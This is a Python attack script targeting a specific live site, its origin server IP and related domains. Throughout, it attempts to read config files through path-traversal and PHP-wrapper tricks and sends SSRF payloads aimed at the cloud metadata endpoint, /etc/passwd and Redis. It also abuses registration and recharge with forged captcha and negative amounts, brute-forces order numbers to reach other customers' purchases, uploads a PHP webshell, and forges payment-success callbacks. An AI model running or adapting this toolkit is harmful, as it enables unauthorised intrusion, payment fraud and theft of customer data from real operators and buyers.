#!/usr/bin/env python3
"""qq1.lol deep4 — 403 bypass, getshuoshuo/toollogs/workorder, reg/recharge, query WAF, trade_no, related sites"""
import hashlib
import json
import os
import re
import subprocess
import time
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, urlencode

BASE = "https://qq1.lol"
ORIGIN = "http://45.158.21.213"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "deep4.log"
HITS = OUT / "deep4_hits.jsonl"
JAR = str(OUT / ".deep4_cookies")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HDR = ["-H", f"Referer: {BASE}/", "-H", "X-Requested-With: XMLHttpRequest"]
TIMEOUT = os.environ.get("QQ1_TIMEOUT", "14")

RELATED = ["https://fffzz.lol", "https://hmjf.lol", "https://htqq.lol", "https://kln166.top", "https://q8.qq0.lol"]

CONFIG_PATHS = [
    "config.php", "includes/common.php", "includes/config.php", "includes/database.php",
    "includes/autoload.php", "includes/360safe/webscan_cache.php", "data/config.php",
    "assets/faka/config.php", "install/config.php", ".env", "composer.json", "composer.lock",
    "package.json", "web.config", ".user.ini", "php.ini", "nginx.conf",
]

BYPASS_PREFIXES = [
    "", "%2e/", "./", ".%2f", "%2e%2e/", "..%2f", "..;/", ".;/", "/./", "//",
    "%252e%252f", "..%252f", "%c0%ae%c0%ae/", "..%c0%af", "..\\", "..%5c",
]

BYPASS_SUFFIXES = ["", ".bak", ".old", ".save", ".swp", "~", ".txt", ".dist", ".inc", ".php.bak", "%00", "%20"]


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, "detail": detail, "body": (body or "")[:8000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def curl(url, post=None, extra=None, host=None, resolve=None):
    cmd = ["curl", "-sk", f"--max-time={TIMEOUT}", "-b", JAR, "-c", JAR, "-A", UA]
    if host:
        cmd += ["-H", f"Host: {host}"]
    if resolve:
        cmd += ["--resolve", resolve]
    cmd += HDR
    if extra:
        cmd += extra
    if post is not None:
        if isinstance(post, dict) and post.get("_json"):
            cmd += ["-X", "POST", "-H", "Content-Type: application/json", "-d", post["_json"]]
        else:
            cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", post]
    cmd.append(url)
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=int(TIMEOUT) + 8).stdout
    except Exception as e:
        return f"err:{e}"


def get_tokens():
    buy = curl(f"{BASE}/?mod=buy&cid=14&tid=131")
    csrf_m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
    csrf = csrf_m.group(1) if csrf_m else ""
    hs = ""
    hs_m = re.search(r"var hashsalt=(.+);", buy)
    if hs_m:
        try:
            hs = subprocess.run(
                ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
                capture_output=True, text=True, timeout=5,
            ).stdout.strip()
        except Exception:
            pass
    return csrf, hs


def interesting(body, skip=()):
    if not body or len(body) < 10:
        return False
    bad = ("404 Not Found", "403 Forbidden", "No Act", "请提供用户", "验证失败", "不能为空")
    if any(x in body for x in bad if x not in skip):
        if '"code":0' in body and "getcount" not in str(skip):
            return True
        if "请提供" in body or "验证失败" in body:
            return False
    markers = (
        "kminfo", "卡密", "----", "password", "mysql", "DB_", "pdo", "root:",
        "api_key", "syskey", "secret", "access_token", "admin", "成功获取",
        "订单结果", "工单", "上架", "connect", "oauth", "<?php", "define(",
    )
    return any(m in body for m in markers)


def test_403_bypass():
    log("=== [1] 403 bypass config/includes ===")
    wrappers = [
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/read=convert.base64-encode/resource=includes/common.php",
        "phar://config.php",
    ]
    for pre in BYPASS_PREFIXES:
        for path in CONFIG_PATHS[:8]:
            for suf in BYPASS_SUFFIXES[:6]:
                p = f"{pre}{path}{suf}"
                url = f"{BASE}/{p}"
                body = curl(url)
                if interesting(body):
                    hit("403_bypass", url, body)
    for w in wrappers:
        for param in ("file", "page", "mod", "template", "include", "path", "f", "url"):
            body = curl(f"{BASE}/?{param}={quote(w)}")
            if interesting(body):
                hit("lfi_wrapper", f"{param}={w}", body)
    # nginx alias tricks
    tricks = [
        "/includes%00/common.php", "/includes/..%2fconfig.php", "/static/../config.php",
        "/assets/../config.php", "/user/../config.php", "/other/../includes/common.php",
        "/.%2e/config.php", "/config.php%23", "/config.php/", "/config.php\\",
        "/Config.php", "/CONFIG.PHP", "/config.PHP", "/config.phps",
    ]
    for t in tricks:
        body = curl(BASE + t)
        if interesting(body) or (body and "403" not in body and "define" in body):
            hit("path_trick", t, body)


def test_getshuoshuo(hs):
    log("=== [2] getshuoshuo / getshareid / getrizhi ===")
    qq_list = [
        "10000", "10001", "830603", "123456", "88888888", "buyi", "qqkqq",
        "100000000", "100000001", "1234567890", "987654321", "111111111",
    ]
    for uin in qq_list:
        body = curl(f"{BASE}/ajax.php?act=getshuoshuo&uin={uin}&page=1&hashsalt={hs}")
        if body and '"code":0' in body:
            hit("getshuoshuo", uin, body)
    # SSRF getshareid
    ssrf_urls = [
        "http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/",
        "file:///etc/passwd", f"{BASE}/config.php", "http://45.158.21.213/",
        "dict://127.0.0.1:6379/info", "gopher://127.0.0.1:6379/_INFO",
    ]
    for u in ssrf_urls:
        body = curl(f"{BASE}/ajax.php?act=getshareid&url={quote(u)}")
        if interesting(body, skip=("url不能为空",)):
            hit("ssrf_getshareid", u, body)
    for act in ("getrizhi", "getrizhi&id=1", "getrizhi&page=1", "getrizhi&type=admin"):
        body = curl(f"{BASE}/ajax.php?act={act}")
        if body and "No Act" not in body and len(body) > 20:
            hit("getrizhi", act, body)


def test_toollogs_workorder():
    log("=== [3] toollogs / workorder ===")
    pages = [
        "toollogs.php", "toollogs.php?tid=131", "toollogs.php?tid=1", "toollogs.php?page=1",
        "toollogs.php?act=list", "toollogs.php?ajax=1", "toollogs.php?export=1",
        "user/workorder.php", "user/workorder.php?my=list", "user/workorder.php?my=add",
        "user/workorder.php?act=list", "user/workorder.php?id=1",
    ]
    for p in pages:
        body = curl(f"{BASE}/{p}")
        if interesting(body) or (body and "工单" in body and "暂无" not in body and len(body) > 800):
            hit("toollogs_wo", p, body[:2000])
    wo_acts = ["list", "add", "view", "reply", "close", "getlist", "submit", "detail", "info"]
    for act in wo_acts:
        body = curl(f"{BASE}/ajax.php?act=workorder", f"do={act}")
        if body and "No Act" not in body:
            hit("workorder_ajax", act, body)
        body2 = curl(f"{BASE}/user/ajax.php?act={act}")
        if body2 and "No Act" not in body and len(body2) > 15:
            hit("user_ajax_wo", act, body2)


def test_reg_recharge(csrf, hs):
    log("=== [4] reg / recharge bypass ===")
    users = [f"probe{int(time.time())%100000}", f"test{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"]
    for user in users:
        for post in [
            f"user={user}&pass=Test123456&qq=123456789&email={user}@test.com&csrf_token={csrf}",
            f"user={user}&pass=Test123456&qq=123456789&csrf_token={csrf}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
            f"user={user}&pass=Test123456&qq=123456789&csrf_token={csrf}&captcha=1",
            f"user={user}&pass=Test123456&qq=123456789&csrf_token={csrf}&money=9999&admin=1&role=admin",
        ]:
            body = curl(f"{BASE}/ajax.php?act=reg", post)
            if body and ("成功" in body or ('"code":0' in body and "验证" not in body)):
                hit("reg_bypass", post[:80], body)
    for post in [
        f"money=0.01&csrf_token={csrf}",
        f"money=-1&csrf_token={csrf}",
        f"money=99999&type=alipay&csrf_token={csrf}",
        f"amount=0&csrf_token={csrf}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
    ]:
        body = curl(f"{BASE}/ajax.php?act=recharge", post)
        if body and '"code":0' in body:
            hit("recharge", post[:60], body)


def test_query_waf():
    log("=== [5] query WAF bypass ===")
    contacts = ["25946", "25945", "buyi", "qqkqq", "830603", "12345678901", "20260720145603146"]
    encodings = [
        lambda c: c,
        lambda c: quote(c),
        lambda c: quote(quote(c)),
        lambda c: c.replace("2", "%32"),
        lambda c: "".join(f"%u00{ord(ch):02x}"[-2:] for ch in c) if False else c,
    ]
    payloads = []
    for c in contacts:
        payloads.append(c)
        payloads.append(quote(c))
        payloads.append(quote(quote(c)))
    for data in payloads:
        for url in (
            f"{BASE}/?mod=query&data={data}",
            f"{BASE}/ajax.php?act=query&data={data}",
            f"{BASE}/ajax.php?act=query&contact={data}",
            f"{BASE}/ajax.php?act=query&qq={data}",
            f"{BASE}/ajax.php?act=query&orderid={data}",
        ):
            body = curl(url, extra=["-H", "X-Forwarded-For: 127.0.0.1"])
            if interesting(body) or (body and "kminfo" in body):
                hit("query_waf", url, body)
            body2 = curl(url, post=f"data={data}")
            if interesting(body2):
                hit("query_post", url, body2)


def test_trade_no_window():
    log("=== [6] trade_no / getshop brute (recent) ===")
    now = datetime.now()
    # format: YYYYMMDDHHMMSS + 3 digit seq
    windows = [0, 1, 2, 5, 10, 30, 60, 120, 180]
    found = 0
    for mins in windows:
        t = now - timedelta(minutes=mins)
        base = t.strftime("%Y%m%d%H%M")
        for sec in range(0, 60, 5):
            for seq in range(0, 1000, 111):
                tn = f"{base}{sec:02d}{seq:03d}"
                body = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
                if body and "未付款" not in body and "不存在" not in body and len(body) > 20:
                    hit("getshop_paid", tn, body)
                    found += 1
                    if found >= 3:
                        return
        log(f"  scanned ~{mins}m ago window")


def test_upload(csrf):
    log("=== [7] upload bypass ===")
    php = b"<?php echo 'pwn'; ?>"
    paths = ["/tmp/shell.php", "/tmp/shell.jpg", "/tmp/shell.phtml"]
    for p in paths:
        Path(p).write_bytes(php if b"." not in p.encode() else php)
    for ep in ("ajax.php?act=upload", "user/ajax.php?act=upload", "sup/ajax.php?act=upload"):
        for fname, ctype in (("shell.php", "image/jpeg"), ("shell.jpg", "image/jpeg"), ("shell.phtml", "application/octet-stream")):
            cmd = [
                "curl", "-sk", f"--max-time={TIMEOUT}", "-b", JAR, "-c", JAR, "-A", UA,
                "-H", f"Referer: {BASE}/", "-H", "X-Requested-With: XMLHttpRequest",
                "-F", f"file=@{fname};type={ctype}", "-F", f"csrf_token={csrf}",
                f"{BASE}/{ep}",
            ]
            try:
                body = subprocess.run(cmd, capture_output=True, text=True, timeout=int(TIMEOUT) + 8).stdout
                if body and ('"code":0' in body or "upload" in body.lower() or "成功" in body):
                    hit("upload", f"{ep} {fname}", body)
            except Exception:
                pass


def test_related_sites():
    log("=== [8] related sites cross-session ===")
    curl(BASE + "/")
    jar_content = Path(JAR).read_text() if Path(JAR).exists() else ""
    for site in RELATED:
        body = curl(f"{site}/ajax.php?act=getcount")
        if body and '"code":0' in body:
            hit("related_getcount", site, body)
        body2 = curl(f"{site}/%61pi.php?act=search&id=1&key=buyi")
        if body2 and "请提供" not in body2:
            hit("related_api", site, body2)
        # try same cookies
        body3 = curl(f"{site}/ajax.php?act=getcount", extra=["-b", JAR])
        if body3 and '"code":0' in body3:
            hit("related_cookie", site, body3)


def test_origin_direct():
    log("=== [9] origin IP direct ===")
    host = "qq1.lol"
    resolve = f"{host}:80:45.158.21.213"
    for path in ("/ajax.php?act=getcount", "/config.php", "/includes/common.php", "/%61pi.php?act=search&id=1&key=buyi"):
        body = curl(f"http://{host}{path}", host=host, resolve=resolve)
        if interesting(body) or ('"code":0' in body):
            hit("origin_direct", path, body)


def test_sup_user_ajax(csrf):
    log("=== [10] sup/user hidden acts ===")
    acts = [
        "orderlist", "getorder", "getmoney", "config", "siteinfo", "getconfig", "getsite",
        "sendcard", "kami", "faka", "cardlist", "getcard", "toollist", "addtool", "edittool",
        "delorder", "orderinfo", "exportorder", "import", "backup", "restore", "resetpwd",
        "quicklogin", "autologin", "tokenlogin", "apiinfo", "getkey", "setkey", "test",
    ]
    for ep in ("sup/ajax.php", "user/ajax.php"):
        for act in acts:
            body = curl(f"{BASE}/{ep}?act={act}", f"csrf_token={csrf}")
            if body and "No Act" not in body and len(body) > 12:
                if '"code":0' in body or interesting(body):
                    hit("hidden_act", f"{ep}?act={act}", body)


def test_pay_notify_race(csrf, hs):
    log("=== [11] pay notify race / cancel ===")
    post = (
        f"tid=131&num=1&inputvalue=testuser&csrf_token={csrf}&hashsalt={hs}"
        "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan"
    )
    body = curl(f"{BASE}/ajax.php?act=pay", post)
    m = re.search(r'"trade_no"\s*:\s*"(\d+)"', body) or re.search(r"orderid=(\d+)", body)
    if not m:
        log(f"  pay create failed: {body[:120]}")
        return
    tn = m.group(1)
    log(f"  created order {tn}")
    notify_posts = [
        f"out_trade_no={tn}&trade_status=TRADE_SUCCESS&money=99&type=alipay",
        f"trade_no={tn}&status=1&money=0.01",
        urlencode({"out_trade_no": tn, "trade_status": "TRADE_SUCCESS", "money": "0"}),
    ]
    for ep in ("epay_notify.php", "other/epay_notify.php", "alipay_notify.php", "other/alipay_notify.php",
               "qqpay_notify.php", "wxpay_notify.php", "other/usdt_notify.php", "other/rmb_notify.php"):
        for np in notify_posts:
            b1 = curl(f"{BASE}/{ep}", np)
            b2 = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
            if b2 and "未付款" not in b2:
                hit("notify_race", f"{ep} -> getshop {tn}", b2)
            if b1 and b1 not in ("error", "fail", "签名失败", ""):
                if "success" in b1.lower() or "ok" in b1.lower():
                    hit("notify_resp", ep, b1)


def main():
    log("=== qq1 DEEP4 START ===")
    csrf, hs = get_tokens()
    log(f"csrf={csrf[:8]}... hashsalt={hs[:8]}...")
    test_403_bypass()
    test_getshuoshuo(hs)
    test_toollogs_workorder()
    test_reg_recharge(csrf, hs)
    test_query_waf()
    test_trade_no_window()
    test_upload(csrf)
    test_related_sites()
    test_origin_direct()
    test_sup_user_ajax(csrf)
    test_pay_notify_race(csrf, hs)
    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== DEEP4 DONE hits={n} ===")


if __name__ == "__main__":
    main()
